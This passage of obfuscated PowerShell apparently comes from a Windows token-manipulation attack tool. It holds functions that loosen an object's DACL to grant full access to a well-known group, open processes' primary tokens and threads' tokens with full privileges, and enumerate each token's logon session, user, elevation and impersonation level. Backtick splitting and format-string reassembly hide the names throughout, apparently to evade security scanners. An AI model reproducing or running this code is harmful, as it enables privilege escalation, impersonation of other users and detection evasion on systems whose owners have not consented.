        [IntPtr]${PpDA`cL} =  $B8f4i::"ze`Ro"
        [IntPtr]${PPS`ACl} =   (  gi  ("va"+"Ri"+"ABLe:B8f4"+"I")  ).VAluE::"Z`ERO"
        [IntPtr]${ppSeCUriT`YdE`scR`Ip`T`oR} =   ( gi ('v'+'ar'+'Iabl'+'e:'+'B8F4I') ).valUE::"Ze`RO"
        
        ${rEt`V`Al} = ${Get`s`eCUr`iTYi`NfO}."INvO`Ke"(${HO`BJ`ect}, 0x7, ${w`IN3`2cOns`TAnts}."DA`cl_S`Ecu`R`ItY_`infoRMaT`ion", [Ref]${PPsId`O`wN`ER}, [Ref]${P`pS`idgRoUP}, [Ref]${pp`Da`cl}, [Ref]${pp`SaCL}, [Ref]${PPSeC`URi`TY`deSC`RI`ptOr})
        if (${re`Tv`AL} -ne 0)
        {
            &("{0}{1}{2}" -f'Wri','t','e-Error') ('Unab'+'le'+' '+'t'+'o '+'ca'+'ll '+'GetS'+'ec'+'ur'+'ity'+'I'+'nfo. '+'E'+'rr'+'or'+'Code: '+"$retVal")
        }

        if (${Pp`D`ACL} -ne  $b8f4I::"ze`RO")
        {
            ${AcL`o`BJ} =  ( vARiABle  Y5MVL -VaLuEonl )::"P`TrTO`st`RuCturE"(${pPd`A`cL}, [Type]${a`cl})

            
            [UInt32]${ReA`LSi`ze} = 2000
            ${P`Al`lUs`ERssid} =  $Y5mvL::("{2}{0}{1}{3}" -f'c','HG','Allo','lobal').Invoke(${R`EAlS`iZe})
            ${S`Uc`CESS} = ${Cr`Eatewe`ll`kNow`N`sid}."inVo`kE"(1,  (  geT-chILDiTem  vaRIablE:b8F4i).VAluE::"zE`RO", ${PA`l`lU`SErssID}, [Ref]${rE`Al`SIze})
            if (-not ${S`UcC`esS})
            {
                Throw (&("{3}{2}{1}{0}" -f 't','jec','Ob','New-') ("{1}{2}{4}{5}{0}{3}{8}{7}{6}" -f'Mo','Comp','on','del.W','e','nt','xception','32E','in'))
            }

            
            ${tR`USTE`EsIZe} =   ( get-variABLe  Y5MvL).VAlUE::"sIZ`e`Of"([Type]${trUs`T`EE})
            ${t`Rustee`ptR} =  (VAriaBle  y5mVL ).vALUE::("{1}{0}{2}"-f'llocHGloba','A','l').Invoke(${tru`ST`E`eSiZe})
            ${tRU`st`EEobJ} =   (  vARIAble Y5mvl).VAluE::"pt`R`TosT`R`UctURE"(${T`RUS`TeEptr}, [Type]${tRUs`T`ee})
              $y5mVL::("{2}{1}{0}"-f'l','loba','FreeHG').Invoke(${tR`US`TEEP`TR})
            ${TRu`St`EEobj}."pm`Ulti`pletRuS`Tee" =  (  IteM  ('vaRiaB'+'LE'+':B8F4'+'i')).VALuE::"ze`RO"
            ${Tru`ST`EeoBJ}."mUltiPL`ETrU`S`TEeOPEr`A`TI`On" = 0
            ${TrUSTEe`o`BJ}."trUSteE`F`orm" = ${W`iN32Const`AN`TS}."trUST`EE`_I`s_SID"
            ${tru`S`TEeObj}."t`Ru`s`TeEtYPe" = ${W`iN3`2COnS`TaN`Ts}."TrUst`eE_I`S`_WE`L`l_KNown_G`ROUp"
            ${t`RUsteE`OBJ}."p`TSTRN`AME" = ${p`A`llusER`SsID}

            
            ${e`xPlIC`iTaC`ceSS`sI`ze} =  ( vaRiAblE ('y5M'+'Vl')  ).valuE::"SI`zeof"([Type]${explIc`It_`AC`CESs})
            ${E`xP`lIci`T`AccEsSptR} =  ( vArIABLe ("y5mV"+"l") ).valUE::("{1}{0}{2}" -f 'locHGloba','Al','l').Invoke(${EXPLiC`iTacc`eS`SS`Ize})
            ${eX`pL`iCITACCesS} =   $Y5mVl::"p`TrtOsTruCt`UrE"(${E`xPL`iCiTACc`ES`s`PTR}, [Type]${E`x`pl`IcIT`_AcCEsS})
             (variAbLE  Y5mvl).valuE::("{2}{1}{0}{3}" -f 'H','ree','F','Global').Invoke(${eX`PLIcItaccE`SSP`Tr})
            ${Ex`PLi`ciT`AC`cESS}."grFa`CCESSPeR`MiS`SIONs" = 0xf03ff
            ${exp`L`IcI`TaccEsS}."GrfA`c`cesSMode" = ${wiN32C`on`sT`A`NtS}."g`R`ANT_`ACCess"
            ${expL`I`CiT`AccE`sS}."GrfI`NHeR`iT`ANCe" = ${wIn3`2COnST`A`Nts}."ObJ`eCt_IN`hE`RIT_ace"
            ${eX`Pl`i`ciT`ACCESs}."t`RUStEe" = ${TrU`s`TeeoBJ}

            [IntPtr]${n`E`WdaCL} =   (GEt-varIABlE b8F4I -vAlUEONLy)::"ZE`RO"

            ${Re`Tval} = ${SETeNt`RiEsiN`AC`lW}."inV`OkE"(1, [Ref]${E`x`Pli`cit`AcCesS}, ${pp`DA`Cl}, [Ref]${N`eWDA`cl})
            if (${R`eTval} -ne 0)
            {
                &("{0}{3}{2}{1}"-f'Write-','r','ro','Er') ('E'+'rror '+'call'+'in'+'g '+'SetEn'+'tries'+'I'+'nAc'+'lW:'+' '+"$RetVal")
            }

              $y5Mvl::("{1}{2}{0}"-f 'al','FreeHG','lob').Invoke(${p`ALl`USErSSiD})

            if (${n`Ew`DACl} -eq   (vARIABLe ('b8f4'+'i') -VaLUeON )::"Ze`RO")
            {
                throw ("{3}{1}{2}{0}"-f 'ull',' DACL is ','n','New')
            }

            
            ${re`T`VAl} = ${sEt`sE`Cur`iTYINfo}."iN`VOKE"(${HOb`Je`cT}, 0x7, ${WiN32C`O`NSTan`Ts}."Da`cL`_SEcurIty_`In`FoRMation", ${p`Psido`Wner}, ${PpSi`D`gro`UP}, ${neWd`AcL}, ${PpSA`cl})
            if (${retV`AL} -ne 0)
            {
                &("{2}{0}{1}" -f'rr','or','Write-E') ('SetS'+'e'+'c'+'urit'+'yInfo '+'fa'+'iled. '+'Retu'+'rn '+'val'+'u'+'e: '+"$RetVal")
            }

            ${l`O`cALFr`eE}."IN`VOKe"(${P`PSeCURIt`yDESC`RI`p`TOr}) | &("{0}{2}{1}" -f 'Out-N','ll','u')
        }
    }


    
    function g`et`-prImA`RYTo`kEn
    {
        Param(
            [Parameter(posiTIOn=0, mandATORY=${TR`UE})]
            [UInt32]
            ${pRo`c`essId},

            
            [Parameter()]
            [Switch]
            ${FU`lL`priVs}
        )

        if (${fUL`Lpri`VS})
        {
            ${ToKEnp`R`IvS} = ${w`In32CO`Nst`ANTS}."t`OK`En_aLL`_ACCe`ss"
        }
        else
        {
            ${tOKenp`RI`Vs} = ${WIn3`2c`Ons`TaNTS}."T`OK`EN_ASsign_P`R`ImARy" -bor ${W`in3`2COnsTANtS}."Token_Du`pLica`Te" -bor ${Win3`2c`ONSTAN`Ts}."to`KE`N_IMPE`RsonATe" -bor ${WI`N32`cOns`T`ANTS}."TOke`N_`Query" 
        }

        ${rEtu`RNStR`U`ct} = &("{0}{1}{2}"-f 'New-O','bj','ect') ("{2}{1}{0}"-f't','bjec','PSO')

        ${hp`RoCE`Ss} = ${OPe`NPro`CEss}."I`N`VoKE"(${wIn32`CO`N`sT`ANTs}."PROces`S_qUERY_`InfO`R`Mat`IoN", ${t`RuE}, [UInt32]${PrOCeS`S`Id})
        ${RE`Tu`RNSTRU`cT} | &("{1}{2}{3}{0}"-f'ber','A','dd-M','em') -MemberType ("{1}{2}{0}{3}" -f 'op','NoteP','r','erty') -Name ("{1}{0}"-f 'Process','h') -Value ${hP`R`ocEss}
        if (${Hp`Ro`cE`SS} -eq   (  gI ("va"+"riA"+"bLe:b8"+"f4"+"i") ).vALuE::"Z`ERo")
        {
            
            ${errO`R`codE} =  (  iTEM ("va"+"r"+"IAblE:y5m"+"Vl")).VAlUE::("{0}{3}{1}{2}" -f'G','2Er','ror','etLastWin3').Invoke()
            &("{0}{3}{2}{1}" -f'W','se','Verbo','rite-') "Failed to open process handle for ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error code: $ErrorCode . This is likely because this is a protected process. "
            return ${nu`Ll}
        }
        else
        {
            [IntPtr]${hpr`O`CtOKEn} =   (VaRiaBle ('b8f4'+'i') ).VAlUE::"z`ero"
            ${Su`c`ceSS} = ${Op`ENprocEs`s`TOK`EN}."I`NVO`ke"(${HpR`ocEss}, ${TOke`N`PrIvS}, [Ref]${Hp`RO`CtO`Ken})

            
            if (-not ${C`Lose`hanD`lE}."I`NvoKe"(${hpr`o`ceSs}))
            {
                ${E`R`ROrcodE} =   (ls ('V'+'A'+'rIaB'+'lE:y5mVl') ).vAlUe::("{0}{1}{3}{2}"-f'GetLastW','in','r','32Erro').Invoke()
                &("{1}{0}{2}" -f 'r','W','ite-Warning') ('Fai'+'l'+'ed '+'t'+'o '+'clos'+'e '+'pr'+'o'+'cess '+'han'+'dle'+', '+'this'+' '+'i'+'s '+'une'+'x'+'pecte'+'d. '+'Error'+'C'+'o'+'de: '+"$ErrorCode")
            }
            ${hp`R`ocess} =  ( LS VARIaBLE:b8f4I  ).vALUe::"z`erO"

            if (${SU`Cc`eSS} -eq ${FAl`se} -or ${h`PROCTOk`eN} -eq  ( vaRiabLe ("b"+"8f4i")).Value::"zE`RO")
            {
                ${ErRO`RCO`de} =  (VAriABLE  ('y5M'+'VL') ).VALUe::("{4}{2}{0}{3}{1}" -f 'in32Er','r','tW','ro','GetLas').Invoke()
                &("{4}{2}{3}{0}{1}" -f 'ni','ng','-Wa','r','Write') "Failed to get processes primary token. ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error: $ErrorCode "
                return ${n`UlL}
            }
            else
            {
                ${r`EtUr`NsTRuCT} | &("{1}{0}{2}"-f 'mbe','Add-Me','r') -MemberType ("{1}{0}{2}{3}" -f 'ePr','Not','o','perty') -Name ("{0}{1}{2}"-f 'hProcTo','ke','n') -Value ${HPROC`T`OkEn}
            }
        }

        return ${retuRn`sTR`UCT}
    }


    function GE`T-ThRe`AdtoKEn
    {
        Param(
            [Parameter(pOsITIoN=0, MAndaTORY=${TR`UE})]
            [UInt32]
            ${THre`A`dID}
        )

        ${tO`K`eNPRivS} = ${wIN`32coNsT`AN`Ts}."T`oK`En_all_accE`sS"

        ${r`etsT`Ruct} = &("{2}{0}{1}" -f 'w-','Object','Ne') ("{0}{1}"-f 'PSO','bject')
        [IntPtr]${Hthr`EA`D`TOken} =  (VaRIaBle  ("B8"+"F4I") ).value::"ze`Ro"

        ${HTH`REad} = ${O`Pe`NTHread}."inv`oke"(${W`iN3`2CONs`TA`Nts}."T`hrEad_aLl_ac`C`e`sS", ${F`ALse}, ${t`Hre`AdId})
        if (${H`Thr`EAd} -eq   (  ITEM  vARIablE:B8f4i).vAlue::"Z`ero")
        {
            ${ERr`O`RCoDe} =  (vaRiAbLE  ("Y5m"+"vl") ).VAlUE::("{3}{5}{1}{0}{4}{2}" -f 'n32Er','stWi','or','Ge','r','tLa').Invoke()
            if (${ErR`oRCo`de} -ne ${w`in3`2co`NSt`Ants}."E`RrO`R_Inva`Lid_p`AR`AmeTEr") 
            {
                &("{0}{1}{2}{3}"-f 'Write-Wa','rni','n','g') ('Fa'+'il'+'ed '+'t'+'o '+'open'+' '+'thread'+' '+'ha'+'ndl'+'e '+'fo'+'r '+'T'+'hrea'+'dId: '+"$ThreadId. "+'Erro'+'r '+'cod'+'e'+': '+"$ErrorCode")
            }
        }
        else
        {
            ${Su`CC`ESs} = ${O`PE`Nth`RE`ADTokEn}."iN`VoKe"(${HTHR`eAD}, ${to`keN`PRiVS}, ${fAL`se}, [Ref]${H`Th`Re`AdtOken})
            if (-not ${SUcC`eSs})
            {
                ${Err`oRCO`De} =   $y5mVl::("{0}{2}{1}{3}"-f 'GetLastW','n32Erro','i','r').Invoke()
                if ((${e`RrOr`CO`de} -ne ${WIN32`Co`NSTaNtS}."e`Rr`or_No_Tok`EN") -and  
                 (${eRrorC`o`DE} -ne ${wIn3`2COnStA`N`Ts}."E`Rr`oR_in`ValID_P`A`RaMeteR")) 
                {
                    &("{2}{0}{1}{3}" -f'r','i','W','te-Warning') ('Faile'+'d '+'to'+' '+'ca'+'ll '+'O'+'pe'+'nT'+'hreadT'+'oken '+'fo'+'r '+'Thread'+'Id'+': '+"$ThreadId. "+'Erro'+'r '+'cod'+'e: '+"$ErrorCode")
                }
            }
            else
            {
                if(${iN`st`An`CE}){
                    &("{3}{1}{0}{2}" -f'rbos','e','e','Write-V') ("$Instance "+': '+'Suc'+'cessf'+'ul'+'l'+'y '+'que'+'rie'+'d '+'thread'+' '+'toke'+'n')
                }else{
                    &("{3}{0}{1}{2}" -f'ite-Ver','b','ose','Wr') ("{1}{0}{2}{8}{4}{3}{7}{6}{5}" -f'ces','Suc','sf','ueri','y q','n','toke','ed thread ','ull')
                }
            }

            
            if (-not ${CLO`SeH`ANDLE}."in`V`OkE"(${HT`h`READ}))
            {
                ${Er`R`OrCode} =   ( gET-VarIAbLE ('y5mV'+'L')).vALue::("{3}{2}{1}{0}" -f '2Error','tWin3','etLas','G').Invoke()
                &("{0}{2}{1}" -f 'Write-Wa','ing','rn') ('Failed'+' '+'t'+'o '+'c'+'lose '+'t'+'hrea'+'d '+'h'+'andle'+', '+'this'+' '+'is'+' '+'un'+'expec'+'ted'+'. '+'Err'+'orCod'+'e: '+"$ErrorCode")
            }
            ${htHre`Ad} =  ( Get-chIlDITEM  ('v'+'ariaBL'+'e:b'+'8F4i') ).VALuE::"z`ero"
        }

        ${rETS`TRu`ct} | &("{2}{0}{1}"-f'dd-Membe','r','A') -MemberType ("{1}{2}{3}{0}"-f'y','Not','ePro','pert') -Name ("{0}{3}{2}{1}" -f 'h','eadToken','r','Th') -Value ${htHR`E`AdTOkeN}
        return ${rETS`TRU`Ct}
    }


    
    function gE`T-`TOkENInfo`RM`ATiON
    {
        Param(
            [Parameter(POSition=0, MAnDAtoRy=${T`RUE})]
            [IntPtr]
            ${H`TOKen}
        )

        ${REt`URn`oBJ} = ${n`Ull}

        ${tOKenSTa`Ts`Si`ZE} =   $Y5mvl::"SiZ`eoF"([Type]${To`keN_`S`TATIS`TICs})
        [IntPtr]${TO`k`ENSTat`sPTR} =  (  gEt-chILdITeM ("VaRI"+"ABl"+"E:"+"y5mvL")).vALuE::("{1}{0}{2}"-f'ob','AllocHGl','al').Invoke(${t`OkEnsT`ATs`S`IzE})
        [UInt32]${realS`I`ZE} = 0
        ${sUc`C`ESS} = ${gE`TTO`Ke`NINf`or`MAtIon}."invo`kE"(${h`T`OkEn}, ${tOKEN_inf`o`R`M`AtIon_`claSS}::"TokEnS`TATI`St`iCs", ${TOK`eNsTA`T`sP`TR}, ${T`OKen`st`AT`Ssize}, [Ref]${REAls`i`ze})
        if (-not ${SUC`Cess})
        {
            ${ErR`OR`CO`de} =   (IteM  ('VaRiABl'+'e'+':y5mv'+'l')).vALUe::("{2}{5}{1}{0}{4}{3}" -f '32E','n','GetLa','r','rro','stWi').Invoke()
            &("{2}{1}{0}"-f'ing','ite-Warn','Wr') ('GetT'+'ok'+'enInformation'+' '+'fa'+'i'+'led. '+'Er'+'ror '+'c'+'ode: '+"$ErrorCode")
        }
        else
        {
            ${To`ke`NS`TAtS} =  (LS  ('v'+'aR'+'IA'+'blE:Y5M'+'vL')  ).VaLUE::"PTRTOS`TrucT`U`Re"(${tOkenS`T`A`TsptR}, [Type]${t`Ok`en_`St`A`TIsTiCs})

            
            ${L`UiD`ptr} =  $y5MvL::"aLLOCh`G`LOb`AL"(  $Y5MvL::"SI`ZEOf"([Type]${l`Uid}))
              (get-itEm  ('va'+'ri'+'abLe:'+'y5mvl') ).ValuE::("{2}{3}{1}{0}"-f'r','ToPt','St','ructure').Invoke(${toke`Nst`AtS}."au`T`HEntI`caTioNid", ${lU`iD`PtR}, ${FAl`se})

            [IntPtr]${loGoN`SE`s`sIONDa`TA`PtR} =  ( gi  vARIABLE:B8F4i ).VALuE::"zE`RO"
            ${Re`TURNv`AL} = ${L`SaGETlog`OnSEsSIoNd`AtA}."InVo`Ke"(${Lu`IdP`TR}, [Ref]${l`og`o`NseSsIoNdatap`Tr})
            if (${r`Etu`RNvaL} -ne 0 -and ${logOn`SEssIoNDAt`Ap`Tr} -eq  ( Get-vaRIAbLe b8F4I -Val )::"Ze`RO")
            {
                &("{2}{1}{0}"-f 'ning','-War','Write') ('Ca'+'ll '+'to'+' '+'LsaGetLogo'+'nSession'+'Data'+' '+'fa'+'ile'+'d. '+'Erro'+'r '+'c'+'ode: '+"$ReturnVal. "+'Logon'+'Se'+'ssionDat'+'aP'+'t'+'r '+'= '+"$LogonSessionDataPtr")
            }
            else
            {
                ${log`O`N`S`EssIONdaTA} =  ( gEt-ITem VARIAblE:y5MVl  ).vAlue::"pTrTOSTr`Uctu`Re"(${lO`G`o`NS`EsSioNdATAPtr}, [Type]${secuRiTy`_l`OG`ON_`sE`ss`iOn_`DATA})
                if (${LoGOnSe`sSI`O`NDAta}."U`SeRNaMe"."bu`FFeR" -ne   ( variABLe ("b8"+"F4I")  -VAlU )::"Ze`Ro" -and 
                    ${L`OGOnS`EsSIon`da`TA}."L`oGi`NDoMAIN"."BU`FFER" -ne  $B8f4I::"z`ERO")
                {
                    
                    ${U`S`eRNa`ME} =  (  diR vAriAblE:y5mvL ).VAlue::("{2}{1}{0}{3}{4}"-f'ToS','tr','P','tringU','ni').Invoke(${LOgONSE`Ssi`o`Nd`AtA}."U`sERnA`me"."b`UfFeR", ${lOG`onsE`ssiO`NdA`TA}."uS`ER`NAmE"."le`Ngth"/2)
                    ${d`o`main} =  (  variaBlE y5mvL -vALU  )::("{0}{3}{2}{1}" -f'Ptr','ni','gU','ToStrin').Invoke(${LO`gONS`esSionDa`Ta}."lOgin`D`O`MaIN"."bUfF`eR", ${l`Ogo`NSeSsIond`ATa}."LO`Gi`NDOMaIN"."LE`NGTh"/2)

                    
                    
                    
                    if (${UsE`RN`Ame} -ieq "$($env:COMPUTERNAME)`$")
                    {
                        [UInt32]${sI`Ze} = 100
                        [UInt32]${nuMUSE`RnaM`ECH`AR} = ${S`IZE} / 2
                        [UInt32]${Num`do`MAI`Nch`Ar} = ${s`IZe} / 2
                        [UInt32]${si`D`Nam`EUSE} = 0
                        ${Us`eRna`MeB`UffER} =   $Y5mvl::("{2}{0}{1}"-f 'locHGlo','bal','Al').Invoke(${s`IZE})
                        ${DoMai`NB`UFfEr} =   $y5MVl::("{1}{0}{3}{2}" -f'lloc','A','lobal','HG').Invoke(${s`iZe})
                        ${Su`Cc`esS} = ${l`oOkUPAcCOu`Nts`I`Dw}."invO`ke"(  ( GEt-vaRIaBLe  b8F4I -vALUEONl )::"Z`ero", ${L`ogo`NseSSIo`N`daTA}."s`id", ${User`N`Am`EbufFer}, [Ref]${NuM`US`E`RNamEc`HaR}, ${Do`m`AI`NBUF`FEr}, [Ref]${NuMD`o`MaiNcHAR}, [Ref]${sidn`AMEU`SE})

                        if (${S`UC`cess})
                        {
                            ${uSe`Rna`me} =  (vaRIABle ("Y5m"+"vl") -VALUeONLy  )::("{1}{0}{2}{3}{4}" -f 'trToSt','P','ring','Un','i').Invoke(${u`seRNA`MeB`UfFER})
                            ${D`om`Ain} =   (  IteM  VaRIaBLe:Y5MVL  ).VALue::("{3}{0}{1}{2}"-f 'ToS','tringU','ni','Ptr').Invoke(${dOmaI`Nb`UF`FEr})
                        }
                        else
                        {
                            ${ErroR`c`Ode} =  $Y5mvl::("{3}{2}{0}{1}" -f'32Erro','r','etLastWin','G').Invoke()
                            &("{3}{0}{2}{1}"-f 'rn','g','in','Write-Wa') ('E'+'rr'+'or '+'c'+'alling '+'Loo'+'k'+'u'+'pAc'+'c'+'ountSidW. '+'E'+'rror '+'co'+'de: '+"$ErrorCode")
                        }

                          ( iTEm  ("vaRI"+"aBL"+"E:"+"y"+"5MVl")).ValUE::("{1}{2}{0}" -f'al','F','reeHGlob').Invoke(${USE`RNA`MEBufFER})
                        ${userN`A`mE`BuFFer} =  (  geT-VARiAbLE  ('b8'+'F4i') ).VALue::"ZE`RO"
                          ( DIr VAriaBLE:y5MVL  ).VALuE::("{0}{1}{2}"-f 'FreeHG','loba','l').Invoke(${D`O`mAinbuffeR})
                        ${d`O`m`A`INBUFfeR} =  ( Gci  VarIABLE:B8f4I).vALUe::"z`Ero"
                    }

                    ${RETu`Rn`obj} = &("{0}{2}{1}"-f'New-Obj','ct','e') ("{1}{0}{2}"-f 'c','PSObje','t')
                    ${rETur`No`BJ} | &("{2}{0}{1}" -f '-Membe','r','Add') -Type ("{3}{2}{0}{1}"-f 'rt','y','tePrope','No') -Name ("{0}{1}"-f'Domai','n') -Value ${D`O`mAiN}
                    ${r`e`Tur`NOBj} | &("{0}{1}{2}" -f'Add-M','embe','r') -Type ("{0}{1}{2}"-f'Not','eProper','ty') -Name ("{2}{1}{0}"-f 'ame','ern','Us') -Value ${usE`Rn`AME}    
                    ${Re`T`URNObJ} | &("{1}{0}{2}"-f'-Membe','Add','r') -Type ("{0}{3}{1}{2}"-f 'Note','ert','y','Prop') -Name ("{2}{1}{0}" -f'ken','o','hT') -Value ${HtOK`eN}
                    ${rETUR`N`O`BJ} | &("{0}{1}{2}" -f'Add-','M','ember') -Type ("{3}{1}{2}{0}" -f 'roperty','t','eP','No') -Name ("{0}{1}" -f 'LogonTy','pe') -Value ${L`OgoN`Se`SSiOnDAtA}."l`o`gONtYpE"


                    
                    ${R`e`TUR`NOBJ} | &("{0}{2}{1}"-f 'Add','ember','-M') -Type ("{1}{0}{2}" -f 'tePro','No','perty') -Name ("{0}{1}{2}" -f'IsE','levat','ed') -Value ${F`ALse}

                    ${t`ok`eNe`LeV`A`TIONSizE} =  (  GI VaRIablE:y5mVL ).valuE::"s`IZeoF"([Type]${T`Ok`e`N_eL`EvatioN})
                    ${TOKENE`LE`VaTIOn`PtR} =  (ItEM  VAriAblE:y5mVL).VaLue::("{0}{1}{2}"-f 'A','llocHG','lobal').Invoke(${t`OkeneLEv`ATIO`N`SIze})
                    [UInt32]${r`E`AlsizE} = 0
                    ${s`UcCE`Ss} = ${GeT`To`KE`NInFoR`m`A`TiOn}."I`NV`Oke"(${HTOk`eN}, ${tOk`e`N`_inFoRMaT`IOn_ClAss}::"tO`KEN`eL`evat`iOn", ${tokEN`EleVA`TIO`N`Ptr}, ${t`oKENEleVaT`I`ONs`I`ze}, [Ref]${REAL`SiZE})
                    if (-not ${Su`c`CEsS})
                    {
                        ${ErRO`R`C`ODe} =   (  dIR  ("v"+"A"+"rI"+"aBLe:Y5MV"+"l") ).valUE::("{3}{0}{2}{1}" -f 'tLastWin','ror','32Er','Ge').Invoke()
                        &("{2}{1}{0}"-f 'g','-Warnin','Write') ('Ge'+'t'+'T'+'okenIn'+'form'+'ation '+'fail'+'e'+'d '+'t'+'o '+'retriev'+'e'+' '+'Token'+'Elev'+'ati'+'on '+'statu'+'s.'+' '+'ErrorC'+'od'+'e: '+"$ErrorCode") 
                    }
                    else
                    {
                        ${toKENe`Le`VAt`ion} =  (gCi  VarIaBLe:Y5MvL  ).VAlUE::"PTRTosT`RuC`Tu`Re"(${ToKE`NELEvA`TIOnP`Tr}, [Type]${tOk`eN_eLeV`ATi`On})
                        if (${ToKenel`e`V`ATi`on}."TokEn`iSe`leV`A`TED" -ne 0)
                        {
                            ${R`etur`NObJ}."IsELeVa`T`eD" = ${T`Rue}
                        }
                    }
                     (Gi vARIabLe:Y5MVL  ).vaLUe::("{0}{2}{1}"-f'FreeHG','bal','lo').Invoke(${tokenelEV`Ati`onP`TR})


                    
                    ${rE`TuRN`oBJ} | &("{1}{2}{0}" -f'r','Add-M','embe') -Type ("{0}{2}{1}" -f 'NoteP','y','ropert') -Name ("{1}{0}{2}" -f'ken','To','Type') -Value ("{2}{0}{3}{1}" -f'na','Retrieve','U','bleTo')

                    [UInt32]${tOKE`Nty`pEsIze} = 4
                    [IntPtr]${tOk`ENtYpe`PTR} =   $Y5MVl::("{2}{3}{1}{0}"-f'al','lob','Al','locHG').Invoke(${to`KENType`sIZE})
                    [UInt32]${RE`AlSI`ZE} = 0
                    ${S`Uc`CESs} = ${GE`TTO`k`ENi`NFormAT`IOn}."i`NVoKE"(${Ht`OK`eN}, ${T`ok`eN_inFormATIO`N_`cLaSS}::"To`kEn`TyPE", ${T`oK`ent`YPep`TR}, ${tOken`T`y`PEsIzE}, [Ref]${R`EA`LSIZe})
                    if (-not ${suc`C`eSs})
                    {
                        ${Er`RorC`O`dE} =   (GET-vaRIaBLE ('Y5'+'MvL')).VAluE::("{0}{3}{2}{5}{4}{1}" -f 'Get','rror','stW','La','2E','in3').Invoke()
                        &("{1}{0}{2}{3}"-f'e-Wa','Writ','rni','ng') ('GetTo'+'kenInform'+'at'+'ion '+'fai'+'le'+'d '+'to'+' '+'ret'+'riev'+'e '+'To'+'kenImperson'+'at'+'ion'+'Level '+'st'+'a'+'tus. '+'E'+'rr'+'orCode: '+"$ErrorCode")
                    }
                    else
                    {
                        [UInt32]${To`kENT`ypE} =  ( VARIabLE  Y5MVl  -VAluEON  )::"p`TR`To`strUc`TurE"(${To`KENTYP`ePtr}, [Type][UInt32])
                        switch(${Tok`eNt`ypE})
                        {
                            1 {${RET`Ur`NobJ}."TokE`NTy`pE" = ("{0}{2}{1}" -f 'Prim','y','ar')}
                            2 {${RE`TuRN`oBJ}."To`K`entyPe" = ("{1}{2}{3}{0}"-f'sonation','Im','pe','r')}
                        }
                    }
                     (GI  ("vaRiAb"+"Le:Y5"+"M"+"Vl")).vALuE::("{1}{3}{0}{2}" -f 'HGlob','Fre','al','e').Invoke(${tOkentyp`E`P`TR})


                    
                    if (${rE`TU`RnObj}."to`kE`NTYPe" -ieq ("{1}{2}{0}"-f 'ion','Impers','onat'))
                    {
                        ${R`eTu`R`NOBj} | &("{0}{1}{2}"-f'Add-Me','mb','er') -Type ("{0}{2}{1}" -f 'No','roperty','teP') -Name ("{2}{1}{4}{0}{3}"-f 'ev','nati','Imperso','el','onL') -Value ("{1}{2}{0}{3}{4}"-f 't','UnableToR','e','r','ieve')

                        [UInt32]${i`Mp`ErS`O`NAtiOn`Levelsi`ZE} = 4
                        [IntPtr]${Imp`ers`oN`ATiOnLe`Ve`L`ptR} =   (vAriABLe  ('y'+'5mvL')).ValUE::("{0}{2}{1}{3}"-f'All','Glob','ocH','al').Invoke(${impE`R`soNationL`eVE`LSize}) 
                        [UInt32]${R`ea`lsiZE} = 0
                        ${sU`CC`EsS} = ${g`E`TtOk`e`NINforMa`TIon}."i`NV`oKe"(${Hto`k`En}, ${ToKEn`_INfORM`Ati`oN_c`la`sS}::"tOKE`N`IM`pe`RSo`NatI`o`NLEVeL", ${imPeR`SoNAtionl`E`VeL`pTr}, ${iMPeRS`oNaTION`leVe`Lsi`zE}, [Ref]${rE`Als`IZe})
                        if (-not ${sU`cc`eSs})
                        {
                            ${ErrOr`co`DE} =  ( gci  ('VAR'+'IAbl'+'e:y5'+'mvl') ).ValUE::("{1}{2}{3}{0}" -f'32Error','GetL','as','tWin').Invoke()
                            &("{1}{0}{3}{2}"-f 'ite-W','Wr','g','arnin') ('G'+'etTokenIn'+'fo'+'rm'+'ation'+' '+'fail'+'ed '+'to'+' '+'retr'+'ieve'+' '+'T'+'okenImpersonati'+'on'+'Lev'+'el '+'sta'+'t'+'us. '+'ErrorC'+'ode'+':'+' '+"$ErrorCode")
                        }
                        else
                        {
                            [UInt32]${iMpER`sO`N`AT`IonleVeL} =   (dIr VariAble:y5mvl ).vaLUE::"Ptr`TO`S`T`RUcTurE"(${IMPer`SONA`T`iO`Nle`VeLp`TR}, [Type][UInt32])
                            switch (${imPeRsO`NA`Ti`O`NlEvel})
                            {
                                0 { ${rEtuR`N`OBJ}."ImPER`S`ON`AT`IonleVEl" = ("{1}{0}{3}{4}{2}" -f 'r','Secu','nonymous','ity','A') }
                                1 { ${ReTur`NO`Bj}."i`MPeRsON`ATI`Onl`eVeL" = ("{1}{2}{5}{4}{0}{3}" -f'ifica','Securit','yI','tion','t','den') }
                                2 { ${rET`U`RNOBj}."IMper`sO`NAt`IonlEvEl" = ("{3}{1}{5}{0}{2}{4}" -f 'er','rit','sonat','Secu','ion','yImp') }
                                3 { ${R`E`TuRnOBj}."i`MPe`Rso`NA`Ti`ONLEvEl" = ("{2}{1}{4}{3}{0}"-f 'yDelegation','ecur','S','t','i') }
                            }
                        }
                          $y5mvL::("{3}{1}{2}{0}"-f'l','reeHGlob','a','F').Invoke(${i`MPerSONAt`iOnle`V`ElpTr})
                    }


                    
                    ${re`TurnO`Bj} | &("{2}{1}{0}"-f 'er','emb','Add-M') -Type ("{3}{0}{2}{1}"-f 'eP','rty','rope','Not') -Name ("{1}{2}{0}"-f'ID','Sessio','n') -Value ("{2}{1}{0}"-f 'own','n','Unk')

                    [UInt32]${t`okEnsESSiO`NiDS`iZe} = 4
                    [IntPtr]${tOkE`Ns`ESsIoNid`ptr} =  (cHilDItEM  ('VAria'+'BLe:Y5MV'+'l')).vAlUe::("{3}{1}{0}{2}" -f'cHGl','lo','obal','Al').Invoke(${TOke`NSe`S`sIoN`iDSize})
                    [UInt32]${ReA`l`SiZE} = 0
                    ${S`UCCESS} = ${gE`TtO`keN`Inf`Or`MaTION}."iNV`O`Ke"(${hT`oKen}, ${toKEN_`infORMAtio`N_C`L`ASs}::"t`o`KEN`sessioN`Id", ${tOkeNSE`S`SIoN`I`dpTR}, ${T`oKEnSES`Sio`N`iDsiZE}, [Ref]${rEaL`S`i`zE})
                    if (-not ${S`UcCESs})
                    {
                        ${e`Rr`OrcODE} =   (get-VAriABle  ('Y5M'+'VL') ).VALuE::("{1}{2}{3}{0}"-f'or','GetLast','W','in32Err').Invoke()
